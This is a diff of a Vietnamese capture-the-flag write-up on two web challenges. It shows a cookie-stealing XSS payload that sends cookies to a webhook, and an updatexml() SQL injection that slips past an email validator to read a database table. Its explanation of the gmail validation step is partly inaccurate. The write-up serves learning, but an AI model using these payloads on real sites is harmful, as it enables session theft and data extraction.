@@ -48,8 +48,28 @@ http://localhost:9988/changehonk?newhonk[message]=%3Cscript%3Evar%20i%20%3D%20ne
 
 Ở đây ta dùng [webhook](https://webhook.site/) để nhận request có chứa cookie gửi về từ challange (thay url webhook trong payload bằng url webhook của bạn)
 
+Ngoài ra ta có thể thấy payload gán para bằng **?newhonk[message]** thay vì **?newhonk**. Nguyên nhân có điều này bởi vì trong **/** của challange sẽ có code để check xem giá trị của honk có phải là object hay không, nếu là object thì giá trị vẫn được giữ nguyên tức là payload được inject thành công, còn nếu không phải object thì payload sẽ bị clean dẫn đến inject thất bại
+```javascript
+app.get('/', (req, res) => {
+    if (req.cookies.honk){
+        //construct object
+        let finalhonk = {};
+        if (typeof(req.cookies.honk) === 'object'){
+            finalhonk = req.cookies.honk
+        } else {
+            finalhonk = {
+                message: clean(req.cookies.honk), 
+                amountoftimeshonked: req.cookies.honkcount.toString()
+            };
+        }
+        res.send(template(finalhonk.message, finalhonk.amountoftimeshonked));
+```
+Nếu dùng ?newhonk sẽ dẫn đến kết quả ntn:
+![logic-clean](honk-no-object.png)
 
-Tuy nhiên ta không nhận về được flag  
+
+
+Sau khi inject thành công ta vẫn không nhận về được flag  
 ![web-hook-no-flag](web-hook-no-flag.png)
 
 Nhìn thêm vào source code ta thấy **/report** có gọi tới hàm visit trong file goose.js
@@ -141,7 +161,7 @@ page = await browser.newPage();
 
 ## Bookstore
 
-Challange cho ta 1 trang web và source code. Ta có thể dựng lại challenge  bằng docker
+Challange cho ta 1 trang web và source code. Ta có thể dựng lại challenge bằng docker
 
 Truy cập vào trang web của challange có 1 form login và register
 
@@ -215,7 +235,7 @@ Ta có thể lợi dụng hàm này để truyền vào payload thực 
       quotedEmailUser.test(user);
   }
 ```
-Ta có thể dùng " ' để bypass
+Từ đoạn code trên ta thấy nó sẽ lấy ký tự đầu tiên của input đối với payload của ta thì ký tự đó là " . Vì tham số options không được truyền vào hàm isEmail() nên mặc định options.allow_utf8_local_part sẽ là true khi đó nó sẽ check xem " có trong quotedEmailUserUtf8 hoặc quotedEmailUser hay không, mà quotedEmailUserUtf8 là mã regex chứa char code của 65519 ký tự trong bảng UTF-8 mà " có charcode là 34 nên khi input là " thì có thể bypass được isEmail
 
 Nhìn qua file **init.sql** ta sẽ thấy flag được lưu trong table **books**
 ```mysql
@@ -229,11 +249,51 @@ Ta sẽ dùng [updatexml()](https://clbuezzz.wordpress.com/2021/12/28/xpath-err
 
 Payload:
 ```bash
-"',updatexml(1,concat(1,(select texts from books limit 1)),1))#@c.cc
+"',updatexml(1,concat(1,(select texts from books limit 1)),1))#@gmail.com
 ```
 Trong đó:
-- " ' và #@c.cc để bypass qua email validation
+- " ' và #@gmail.com để bypass qua email validation
 - concat(1,(select texts from books limit 1)) để đọc flag từ table books
+
+Ta thêm @gmail.com để bypass đoạn sau của isEmail()
+```javascript
+  const parts = str.split('@');
+  const domain = parts.pop();
+  const lower_domain = domain.toLowerCase();
+
+  if (options.host_blacklist.includes(lower_domain)) {
+    return false;
+  }
+
+  let user = parts.join('@');
+
+  if (options.domain_specific_validation && (lower_domain === 'gmail.com' || lower_domain === 'googlemail.com')) {
+    /*
+      Previously we removed dots for gmail addresses before validating.
+      This was removed because it allows `multiple..dots@gmail.com`
+      to be reported as valid, but it is not.
+      Gmail only normalizes single dots, removing them from here is pointless,
+      should be done in normalizeEmail
+    */
+    user = user.toLowerCase();
+
+    // Removing sub-address from username before gmail validation
+    const username = user.split('+')[0];
+
+    // Dots are not included in gmail length restriction
+    if (!isByteLength(username.replace(/\./g, ''), { min: 6, max: 30 })) {
+      return false;
+    }
+
+    const user_parts = username.split('.');
+    for (let i = 0; i < user_parts.length; i++) {
+      if (!gmailUserPart.test(user_parts[i])) {
+        return false;
+      }
+    }
+  }
+```
+Đoạn code này sẽ lấy các ký tự sau dấu @ và check xem độ dài của các ký tự khi đổi sang mã URL có nằm trong khoảng 6 - 30 hay không và tất cả ký tự có nằm trong khoảng từ a-z hay không
 
 Kết quả:
 ![sqli-flag.png](spli-flag.png)
